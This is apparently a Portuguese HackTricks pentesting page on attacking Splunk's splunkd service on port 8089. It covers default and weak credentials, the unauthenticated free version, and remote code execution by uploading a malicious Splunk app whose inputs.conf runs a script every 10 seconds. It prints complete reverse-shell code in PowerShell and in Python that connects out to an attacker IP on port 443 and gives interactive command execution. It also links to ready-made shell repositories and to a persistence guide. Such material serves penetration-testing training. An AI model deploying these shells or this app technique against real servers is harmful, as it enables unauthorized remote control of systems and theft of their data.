# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## **Informa√ß√µes B√°sicas**

* Ferramenta de an√°lise de logs usada para coleta, an√°lise e visualiza√ß√£o de dados
* Comumente usada em monitoramento de seguran√ßa e an√°lise de neg√≥cios
* Portas padr√£o:
* Servidor web: 8000
* Servi√ßo Splunkd: 8089

### Vetores de Vulnerabilidade:

1. Explora√ß√£o da Vers√£o Gratuita

* A vers√£o de teste se converte automaticamente em vers√£o gratuita ap√≥s 60 dias
* A vers√£o gratuita n√£o possui autentica√ß√£o
* Potencial risco de seguran√ßa se n√£o for gerenciada
* Administradores podem ignorar implica√ß√µes de seguran√ßa

2. Fraquezas de Credenciais

* Vers√µes mais antigas: Credenciais padr√£o `admin:changeme`
* Vers√µes mais novas: Credenciais definidas durante a instala√ß√£o
* Potencial para uso de senhas fracas (por exemplo, `admin`, `Welcome`, `Password123`)

3. Oportunidades de Execu√ß√£o Remota de C√≥digo

* M√∫ltiplos m√©todos de execu√ß√£o de c√≥digo:
* Aplica√ß√µes Django do lado do servidor
* Endpoints REST
* Entradas scriptadas
* Scripts de alerta
* Suporte multiplataforma (Windows/Linux)
* Entradas scriptadas podem executar:
* Scripts Bash
* Scripts PowerShell
* Scripts em lote

Potencial de Explora√ß√£o Chave:

* Armazenamento de dados sens√≠veis
* Falta de autentica√ß√£o na vers√£o gratuita
* M√∫ltiplos vetores para potencial execu√ß√£o remota de c√≥digo
* Possibilidade de aproveitar entradas scriptadas para comprometimento do sistema

### Shodan

* `Splunk build`

## RCE

### Criar Aplica√ß√£o Personalizada

O Splunk oferece um m√©todo sofisticado para execu√ß√£o remota de c√≥digo atrav√©s da implanta√ß√£o de aplica√ß√µes personalizadas, aproveitando suas capacidades de script multiplataforma. A t√©cnica central de explora√ß√£o gira em torno da cria√ß√£o de uma aplica√ß√£o maliciosa que pode executar shells reversos em sistemas Windows e Linux.

Uma aplica√ß√£o personalizada pode executar **scripts Python, Batch, Bash ou PowerShell**. Al√©m disso, **o Splunk vem com Python instalado**, ent√£o mesmo em sistemas **Windows** voc√™ poder√° executar c√≥digo python.

Voc√™ pode usar [**este**](https://github.com/0xjpuff/reverse_shell_splunk) exemplo com o **`bin`** contendo exemplo para [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) e [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Ou voc√™ pode criar o seu pr√≥prio.

O processo de explora√ß√£o segue uma metodologia consistente entre plataformas:
```
splunk_shell/
‚îú‚îÄ‚îÄ bin        (reverse shell scripts)
‚îî‚îÄ‚îÄ default    (inputs.conf configuration)
```
O arquivo de configura√ß√£o cr√≠tico `inputs.conf` ativa o script por:

* Definindo `disabled = 0`
* Configurando um intervalo de execu√ß√£o de 10 segundos
* Definindo o tipo de fonte do script

A implanta√ß√£o √© simples:

1. Crie o pacote de aplicativo malicioso
2. Configure um listener (Netcat/socat) na m√°quina atacante
3. Fa√ßa o upload do aplicativo atrav√©s da interface do Splunk
4. Acione a execu√ß√£o autom√°tica do script ap√≥s o upload

Exemplo de shell reverso do Windows PowerShell:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
};
$client.Close()
```
Exemplo de shell reverso Python no Linux:
```python
import sys, socket, os, pty
ip = "10.10.14.15"
port = "443"
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```
### RCE & Escala√ß√£o de Privil√©gios

Na p√°gina seguinte, voc√™ pode encontrar uma explica√ß√£o de como este servi√ßo pode ser abusado para escalar privil√©gios e obter persist√™ncia:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Refer√™ncias

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
